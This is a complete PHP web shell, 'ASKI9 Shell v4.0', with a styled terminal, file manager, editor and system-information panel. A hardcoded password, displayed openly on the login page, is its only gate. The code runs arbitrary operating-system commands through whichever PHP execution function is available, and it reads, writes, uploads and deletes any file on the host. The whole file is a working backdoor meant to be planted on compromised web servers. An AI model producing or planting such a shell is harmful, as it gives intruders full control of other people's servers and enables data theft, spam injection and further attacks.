<?php
/**
 * ASKI9 Shell v4.0
 * Full Terminal + File Manager
 * Password: seoaski9 (Base64: c2VvYXNraTk=)
 */

// ============================================================
// AUTHENTICATION - Base64 Encoded
// ============================================================

$PASS_B64 = 'c2VvYXNraTk='; // Base64 dari "seoaski9"
$PASS = base64_decode($PASS_B64);

$auth = $_SERVER['HTTP_X_AUTH'] ?? $_GET['auth'] ?? '';

if ($auth !== $PASS) {
    // Login page
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASKI9 Shell</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Courier New',monospace}
        .login{background:#12121e;border:1px solid #00ffc8;border-radius:16px;padding:40px;width:400px}
        .login h1{color:#00ffc8;text-align:center;margin-bottom:20px;font-size:24px}
        .login input{width:100%;padding:12px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-size:14px;margin-bottom:12px;outline:none}
        .login input:focus{border-color:#00ffc8}
        .login button{width:100%;padding:12px;background:#00ffc8;border:none;border-radius:8px;color:#000;font-weight:bold;font-size:14px;cursor:pointer}
        .login button:hover{background:#00ccaa}
        .login .error{color:#ff4466;text-align:center;margin-top:10px;font-size:13px}
        .login .hint{color:#445566;text-align:center;font-size:11px;margin-top:16px}
    </style>
</head>
<body>
    <div class="login">
        <h1>◆ ASKI9</h1>
        <form method="GET">
            <input type="password" name="auth" placeholder="Enter password..." autofocus>
            <button type="submit">Enter</button>
        </form>
        <?php if (isset($_GET['auth']) && $_GET['auth'] !== $PASS): ?>
        <div class="error">Invalid password</div>
        <?php endif; ?>
        <div class="hint">🔑 Password: seoaski9</div>
    </div>
</body>
</html>
    <?php
    exit;
}

// ============================================================
// EXECUTION ENGINE
// ============================================================

function exec_cmd($cmd) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd, $out);
        $output = implode("\n", $out);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    } else {
        $output = 'No execution function available';
    }
    return $output;
}

function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

// ============================================================
// AJAX HANDLER
// ============================================================

if (isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'terminal':
            $cmd = $_POST['cmd'] ?? '';
            echo json_encode(['output' => exec_cmd($cmd)]);
            break;
            
        case 'list_dir':
            $dir = $_POST['dir'] ?? getcwd();
            if (!is_dir($dir)) {
                echo json_encode(['error' => 'Invalid directory']);
                break;
            }
            $items = [];
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $path = $dir . '/' . $file;
                $items[] = [
                    'name' => $file,
                    'path' => $path,
                    'is_dir' => is_dir($path),
                    'size' => is_file($path) ? filesize($path) : 0,
                    'perms' => substr(sprintf('%o', fileperms($path)), -4),
                    'mtime' => date('Y-m-d H:i:s', filemtime($path))
                ];
            }
            usort($items, function($a, $b) {
                if ($a['is_dir'] && !$b['is_dir']) return -1;
                if (!$a['is_dir'] && $b['is_dir']) return 1;
                return strcasecmp($a['name'], $b['name']);
            });
            echo json_encode(['items' => $items, 'path' => $dir]);
            break;
            
        case 'read_file':
            $file = $_POST['file'] ?? '';
            if (!file_exists($file) || !is_readable($file)) {
                echo json_encode(['error' => 'Cannot read file']);
                break;
            }
            echo json_encode(['content' => file_get_contents($file)]);
            break;
            
        case 'save_file':
            $file = $_POST['file'] ?? '';
            $content = $_POST['content'] ?? '';
            if (file_put_contents($file, $content) !== false) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['error' => 'Failed to save']);
            }
            break;
            
        case 'delete_file':
            $file = $_POST['file'] ?? '';
            if (is_dir($file)) {
                rmdir($file);
            } else {
                unlink($file);
            }
            echo json_encode(['success' => true]);
            break;
            
        case 'mkdir':
            $dir = $_POST['dir'] ?? '';
            $name = $_POST['name'] ?? '';
            $path = $dir . '/' . $name;
            echo json_encode(['success' => mkdir($path, 0755)]);
            break;
            
        case 'upload':
            $dir = $_POST['dir'] ?? getcwd();
            if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
                $dest = $dir . '/' . basename($_FILES['file']['name']);
                echo json_encode(['success' => move_uploaded_file($_FILES['file']['tmp_name'], $dest)]);
            } else {
                echo json_encode(['error' => 'Upload failed']);
            }
            break;
            
        case 'sysinfo':
            $dt = disk_total_space('/');
            $df = disk_free_space('/');
            echo json_encode([
                'hostname' => gethostname(),
                'os' => php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m'),
                'user' => get_current_user(),
                'php' => phpversion(),
                'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'ip' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
                'cwd' => getcwd(),
                'disk_total' => format_size($dt),
                'disk_free' => format_size($df),
                'disk_used' => format_size($dt - $df),
                'disk_pct' => round(($dt - $df) / $dt * 100, 1),
                'memory' => ini_get('memory_limit'),
                'max_exec' => ini_get('max_execution_time') . 's',
                'disabled' => ini_get('disable_functions') ?: 'None'
            ]);
            break;
    }
    exit;
}

// ============================================================
// MAIN UI
// ============================================================

$cwd = getcwd();
$PASS_DISPLAY = base64_decode($PASS_B64);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASKI9 Shell v4.0</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;font-family:'Courier New',monospace;color:#ddeeff;min-height:100vh}
        .app{display:flex;height:100vh}
        .sidebar{width:200px;background:#0f0f1a;border-right:1px solid #1a1a2e;padding:20px 0;flex-shrink:0}
        .sidebar .brand{text-align:center;padding:0 16px 20px;border-bottom:1px solid #1a1a2e}
        .sidebar .brand h1{color:#00ffc8;font-size:18px}
        .sidebar .brand small{color:#445566;font-size:10px}
        .sidebar .nav a{display:block;padding:10px 20px;color:#667788;text-decoration:none;font-size:13px;transition:all .2s}
        .sidebar .nav a:hover,.sidebar .nav a.active{color:#00ffc8;background:rgba(0,255,200,0.05)}
        .sidebar .nav a i{width:20px;margin-right:10px}
        .main{flex:1;display:flex;flex-direction:column;overflow:hidden}
        .header{background:#12121e;padding:12px 24px;border-bottom:1px solid #1a1a2e;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
        .header h2{font-size:16px;color:#00ffc8}
        .header .path{color:#667788;font-size:12px;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        .content{flex:1;overflow:auto;padding:16px}
        .panel{background:#12121e;border:1px solid #1a1a2e;border-radius:10px;margin-bottom:16px;overflow:hidden}
        .panel .title{padding:10px 16px;background:#1a1a2e;color:#667788;font-size:11px;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1a1a2e}
        .panel .body{padding:12px 16px}
        .flex{display:flex;gap:8px;flex-wrap:wrap}
        .flex input{flex:1;padding:8px 12px;background:#0a0a0f;border:1px solid #1a1a2e;color:#ddeeff;border-radius:6px;font-size:13px;font-family:'Courier New',monospace;outline:none;min-width:150px}
        .flex input:focus{border-color:#00ffc8}
        .flex button{padding:8px 16px;background:#00ffc8;border:none;border-radius:6px;color:#000;font-weight:bold;font-size:13px;cursor:pointer;font-family:'Courier New',monospace}
        .flex button:hover{background:#00ccaa}
        .flex button.danger{background:#ff4466;color:#fff}
        .flex button.danger:hover{background:#cc2244}
        .flex button.secondary{background:#1a1a2e;color:#667788}
        .flex button.secondary:hover{background:#2a2a3e}
        .terminal{background:#050508;border:1px solid #1a1a2e;border-radius:8px;padding:12px;min-height:200px;max-height:400px;overflow:auto;font-size:13px;line-height:1.6;white-space:pre-wrap;word-break:break-all;color:#ccffaa}
        .terminal .prompt{color:#00ccff}
        .terminal .cmd{color:#ffcc00}
        .terminal .error{color:#ff4466}
        .file-list{max-height:400px;overflow:auto}
        .file-item{display:flex;justify-content:space-between;align-items:center;padding:6px 10px;border-bottom:1px solid #1a1a2e;font-size:13px;cursor:pointer}
        .file-item:hover{background:#1a1a2e}
        .file-item .name{color:#88aacc}
        .file-item .name.dir{color:#00ffc8}
        .file-item .name i{margin-right:8px;width:18px}
        .file-item .size{color:#445566;font-size:11px}
        .file-item .actions a{color:#445566;font-size:11px;margin-left:10px;text-decoration:none}
        .file-item .actions a:hover{color:#00ffc8}
        .file-item .actions a.danger:hover{color:#ff4466}
        .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:4px 20px;font-size:13px}
        .info-grid .row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #1a1a2e}
        .info-grid .row .label{color:#667788}
        .info-grid .row .value{color:#ddeeff;font-family:monospace;font-size:12px}
        .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:1000;align-items:center;justify-content:center}
        .modal.show{display:flex}
        .modal-box{background:#12121e;border:1px solid #00ffc8;border-radius:12px;padding:24px;max-width:600px;width:90%;max-height:80vh;overflow:auto}
        .modal-box h3{color:#00ffc8;margin-bottom:12px}
        .modal-box textarea{width:100%;min-height:200px;background:#0a0a0f;border:1px solid #1a1a2e;color:#ddeeff;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:13px;resize:vertical;outline:none}
        .modal-box textarea:focus{border-color:#00ffc8}
        .modal-box .actions{display:flex;gap:8px;margin-top:12px;justify-content:flex-end}
        ::-webkit-scrollbar{width:4px;height:4px}
        ::-webkit-scrollbar-track{background:transparent}
        ::-webkit-scrollbar-thumb{background:#00ffc8;border-radius:4px}
        @media(max-width:768px){.sidebar{width:60px}.sidebar .brand h1,.sidebar .brand small,.sidebar .nav a span{display:none}.sidebar .nav a{text-align:center}.sidebar .nav a i{margin:0}.header .path{max-width:40%}.info-grid{grid-template-columns:1fr}}
        .file-input-hidden{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
    </style>
</head>
<body>
<div class="app">
    <!-- Sidebar -->
    <div class="sidebar">
        <div class="brand">
            <h1>◆ ASKI9</h1>
            <small>v4.0</small>
        </div>
        <div class="nav">
            <a href="#" class="active" data-page="terminal"><i class="fas fa-terminal"></i><span> Terminal</span></a>
            <a href="#" data-page="files"><i class="fas fa-folder"></i><span> Files</span></a>
            <a href="#" data-page="editor"><i class="fas fa-edit"></i><span> Editor</span></a>
            <a href="#" data-page="info"><i class="fas fa-info-circle"></i><span> Info</span></a>
            <a href="?auth=<?= $PASS ?>&logout=1" style="color:#ff4466;"><i class="fas fa-sign-out-alt"></i><span> Logout</span></a>
        </div>
    </div>
    
    <!-- Main -->
    <div class="main">
        <div class="header">
            <h2 id="pageTitle">◆ Terminal</h2>
            <div class="path" id="currentPath"><?= $cwd ?></div>
        </div>
        <div class="content" id="pageContent">
            <!-- Terminal -->
            <div id="page-terminal">
                <div class="panel">
                    <div class="title"><i class="fas fa-terminal"></i> Command Input</div>
                    <div class="body">
                        <div class="flex">
                            <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter')runCommand()" autofocus>
                            <button onclick="runCommand()"><i class="fas fa-play"></i> Run</button>
                            <button class="danger" onclick="clearTerm()"><i class="fas fa-eraser"></i> Clear</button>
                        </div>
                    </div>
                </div>
                <div class="panel">
                    <div class="title"><i class="fas fa-code"></i> Output</div>
                    <div class="body"><div class="terminal" id="termOutput">Ready for commands...</div></div>
                </div>
            </div>
            
            <!-- Files -->
            <div id="page-files" style="display:none">
                <div class="panel">
                    <div class="title"><i class="fas fa-folder"></i> File Manager</div>
                    <div class="body">
                        <div class="flex" style="margin-bottom:8px">
                            <input type="file" id="uploadInput" multiple style="flex:0;padding:6px">
                            <button onclick="uploadFile()"><i class="fas fa-upload"></i> Upload</button>
                            <input type="text" id="newFolderName" placeholder="Folder name" style="flex:0.5;min-width:100px">
                            <button onclick="createFolder()"><i class="fas fa-folder-plus"></i> Folder</button>
                            <button class="secondary" onclick="refreshFiles()"><i class="fas fa-sync"></i> Refresh</button>
                        </div>
                        <div id="fileList" class="file-list">Loading...</div>
                    </div>
                </div>
            </div>
            
            <!-- Editor -->
            <div id="page-editor" style="display:none">
                <div class="panel">
                    <div class="title"><i class="fas fa-edit"></i> File Editor</div>
                    <div class="body">
                        <input type="text" id="editorPath" placeholder="/path/to/file.php" style="width:100%;padding:8px 12px;background:#0a0a0f;border:1px solid #1a1a2e;color:#ddeeff;border-radius:6px;font-size:13px;font-family:'Courier New',monospace;outline:none;margin-bottom:8px">
                        <textarea id="editorContent" rows="15" placeholder="File content..." style="width:100%;background:#0a0a0f;border:1px solid #1a1a2e;color:#ddeeff;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:13px;resize:vertical;outline:none"></textarea>
                        <div class="flex" style="margin-top:8px">
                            <button onclick="loadFile()"><i class="fas fa-folder-open"></i> Load</button>
                            <button onclick="saveFile()"><i class="fas fa-save"></i> Save</button>
                            <button class="danger" onclick="document.getElementById('editorPath').value='';document.getElementById('editorContent').value=''"><i class="fas fa-eraser"></i> Clear</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Info -->
            <div id="page-info" style="display:none">
                <div class="panel">
                    <div class="title"><i class="fas fa-microchip"></i> System Information</div>
                    <div class="body"><div class="info-grid" id="infoGrid">Loading...</div></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Editor Modal -->
<div class="modal" id="editorModal">
    <div class="modal-box">
        <h3><i class="fas fa-edit"></i> Edit File</h3>
        <input type="text" id="modalEditorPath" placeholder="/path/to/file.php" style="width:100%;padding:8px 12px;background:#0a0a0f;border:1px solid #1a1a2e;color:#ddeeff;border-radius:6px;font-size:13px;font-family:'Courier New',monospace;outline:none;margin-bottom:8px">
        <textarea id="modalEditorContent" rows="12" placeholder="File content..." style="width:100%;background:#0a0a0f;border:1px solid #1a1a2e;color:#ddeeff;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:13px;resize:vertical;outline:none"></textarea>
        <div class="actions">
            <button onclick="closeModal()" class="secondary" style="background:#1a1a2e;border:none;border-radius:6px;color:#667788;font-weight:bold;padding:8px 16px;cursor:pointer">Cancel</button>
            <button onclick="saveModalFile()" style="background:#00ffc8;border:none;border-radius:6px;color:#000;font-weight:bold;padding:8px 16px;cursor:pointer">Save</button>
        </div>
    </div>
</div>

<script>
// ============================================================
// NAVIGATION
// ============================================================
const pages = ['terminal', 'files', 'editor', 'info'];
let currentDir = '<?= $cwd ?>';
let currentFile = null;

document.querySelectorAll('.nav a[data-page]').forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        const page = this.dataset.page;
        document.querySelectorAll('.nav a').forEach(a => a.classList.remove('active'));
        this.classList.add('active');
        pages.forEach(p => {
            document.getElementById('page-' + p).style.display = p === page ? 'block' : 'none';
        });
        document.getElementById('pageTitle').textContent = '◆ ' + page.charAt(0).toUpperCase() + page.slice(1);
        if (page === 'files') refreshFiles();
        if (page === 'info') loadInfo();
        if (page === 'terminal') document.getElementById('cmdInput').focus();
    });
});

// ============================================================
// TERMINAL
// ============================================================

function runCommand() {
    const input = document.getElementById('cmdInput');
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = '';
    const output = document.getElementById('termOutput');
    output.innerHTML += '<div class="prompt">$ <span class="cmd">' + escapeHtml(cmd) + '</span></div>';
    output.innerHTML += '<div>Executing...</div>';
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=terminal&cmd=' + encodeURIComponent(cmd)
    })
    .then(res => res.json())
    .then(data => {
        output.innerHTML = output.innerHTML.replace('<div>Executing...</div>', '');
        output.innerHTML += '<div>' + escapeHtml(data.output || '(no output)') + '</div>';
        output.scrollTop = output.scrollHeight;
    })
    .catch(() => {
        output.innerHTML = output.innerHTML.replace('<div>Executing...</div>', '');
        output.innerHTML += '<div class="error">Error executing command</div>';
    });
}

function clearTerm() {
    document.getElementById('termOutput').innerHTML = 'Ready for commands...';
}

document.getElementById('cmdInput').addEventListener('keydown', function(e) {
    if (e.key === 'ArrowUp') {
        // History up
    }
});

// ============================================================
// FILE MANAGER
// ============================================================

function refreshFiles() {
    const list = document.getElementById('fileList');
    list.innerHTML = 'Loading...';
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=list_dir&dir=' + encodeURIComponent(currentDir)
    })
    .then(res => res.json())
    .then(data => {
        if (data.error) {
            list.innerHTML = '<div class="error">' + data.error + '</div>';
            return;
        }
        document.getElementById('currentPath').textContent = data.path;
        let html = '';
        data.items.forEach(item => {
            const icon = item.is_dir ? 'fa-folder' : 'fa-file';
            const cls = item.is_dir ? 'dir' : '';
            html += '<div class="file-item">';
            html += '<div class="name ' + cls + '" onclick="' + (item.is_dir ? 'navigateTo(\'' + item.path + '\')' : 'openEditor(\'' + item.path + '\')') + '">';
            html += '<i class="fas ' + icon + '"></i>' + item.name;
            html += '</div>';
            html += '<div class="size">' + (item.is_dir ? '—' : formatSize(item.size)) + '</div>';
            html += '<div class="actions">';
            if (!item.is_dir) {
                html += '<a href="#" onclick="openEditor(\'' + item.path + '\')"><i class="fas fa-edit"></i></a>';
                html += '<a href="#" onclick="deleteFile(\'' + item.path + '\')" class="danger"><i class="fas fa-trash"></i></a>';
            } else {
                html += '<a href="#" onclick="deleteFile(\'' + item.path + '\')" class="danger"><i class="fas fa-trash"></i></a>';
            }
            html += '</div></div>';
        });
        list.innerHTML = html || '<div style="color:#445566;padding:20px;text-align:center">Empty directory</div>';
    })
    .catch(() => list.innerHTML = '<div class="error">Error loading directory</div>');
}

function navigateTo(path) {
    currentDir = path;
    refreshFiles();
}

function formatSize(bytes) {
    if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(2) + ' GB';
    if (bytes >= 1048576) return (bytes / 1048576).toFixed(2) + ' MB';
    if (bytes >= 1024) return (bytes / 1024).toFixed(2) + ' KB';
    return bytes + ' B';
}

// ============================================================
// UPLOAD
// ============================================================

function uploadFile() {
    const input = document.getElementById('uploadInput');
    if (!input.files.length) return;
    const file = input.files[0];
    const formData = new FormData();
    formData.append('ajax', '1');
    formData.append('action', 'upload');
    formData.append('dir', currentDir);
    formData.append('file', file);
    fetch('', { method: 'POST', body: formData })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            refreshFiles();
            document.getElementById('uploadInput').value = '';
        }
    });
}

// ============================================================
// FOLDER
// ============================================================

function createFolder() {
    const name = document.getElementById('newFolderName').value.trim();
    if (!name) return;
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=mkdir&dir=' + encodeURIComponent(currentDir) + '&name=' + encodeURIComponent(name)
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            document.getElementById('newFolderName').value = '';
            refreshFiles();
        }
    });
}

// ============================================================
// DELETE
// ============================================================

function deleteFile(path) {
    if (!confirm('Delete ' + path + '?')) return;
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=delete_file&file=' + encodeURIComponent(path)
    })
    .then(res => res.json())
    .then(() => refreshFiles());
}

// ============================================================
// EDITOR
// ============================================================

function openEditor(path) {
    document.getElementById('editorPath').value = path;
    loadFile();
    document.querySelector('[data-page="editor"]').click();
}

function loadFile() {
    const path = document.getElementById('editorPath').value.trim();
    if (!path) return;
    document.getElementById('editorContent').value = 'Loading...';
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=read_file&file=' + encodeURIComponent(path)
    })
    .then(res => res.json())
    .then(data => {
        if (data.error) {
            document.getElementById('editorContent').value = 'Error: ' + data.error;
        } else {
            document.getElementById('editorContent').value = data.content;
        }
    });
}

function saveFile() {
    const path = document.getElementById('editorPath').value.trim();
    const content = document.getElementById('editorContent').value;
    if (!path) return;
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=save_file&file=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
    })
    .then(res => res.json())
    .then(data => {
        alert(data.success ? 'Saved!' : 'Failed to save');
    });
}

function openModalEditor(path) {
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=read_file&file=' + encodeURIComponent(path)
    })
    .then(res => res.json())
    .then(data => {
        if (!data.error) {
            document.getElementById('modalEditorPath').value = path;
            document.getElementById('modalEditorContent').value = data.content;
            document.getElementById('editorModal').classList.add('show');
        }
    });
}

function saveModalFile() {
    const path = document.getElementById('modalEditorPath').value.trim();
    const content = document.getElementById('modalEditorContent').value;
    if (!path) return;
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=save_file&file=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            alert('Saved!');
            closeModal();
            refreshFiles();
        } else {
            alert('Failed to save');
        }
    });
}

function closeModal() {
    document.getElementById('editorModal').classList.remove('show');
}

// ============================================================
// INFO
// ============================================================

function loadInfo() {
    const grid = document.getElementById('infoGrid');
    grid.innerHTML = 'Loading...';
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ajax=1&action=sysinfo'
    })
    .then(res => res.json())
    .then(data => {
        let html = '';
        const fields = [
            ['Hostname', data.hostname],
            ['OS', data.os],
            ['User', data.user],
            ['PHP Version', data.php],
            ['Server', data.server],
            ['Server IP', data.ip],
            ['Current Dir', data.cwd],
            ['Disk Total', data.disk_total],
            ['Disk Used', data.disk_used],
            ['Disk Free', data.disk_free],
            ['Disk Usage', data.disk_pct + '%'],
            ['Memory Limit', data.memory],
            ['Max Execution', data.max_exec],
            ['Disabled Functions', data.disabled]
        ];
        fields.forEach(f => {
            html += '<div class="row"><span class="label">' + f[0] + '</span><span class="value">' + escapeHtml(String(f[1] || 'N/A')) + '</span></div>';
        });
        grid.innerHTML = html;
    })
    .catch(() => grid.innerHTML = 'Error loading system info');
}

// ============================================================
// UTILITY
// ============================================================

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============================================================
// KEYBOARD SHORTCUTS
// ============================================================

document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.key === 'Enter') {
        if (document.getElementById('page-editor').style.display !== 'none') {
            saveFile();
        }
    }
    if (e.key === 'Escape') {
        closeModal();
    }
    if (e.ctrlKey && e.key === 'l') {
        e.preventDefault();
        document.getElementById('cmdInput').focus();
    }
});

// ============================================================
// INIT
// ============================================================

refreshFiles();
loadInfo();
document.getElementById('cmdInput').focus();
</script>
</body>
</html>
<?php
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}
?>
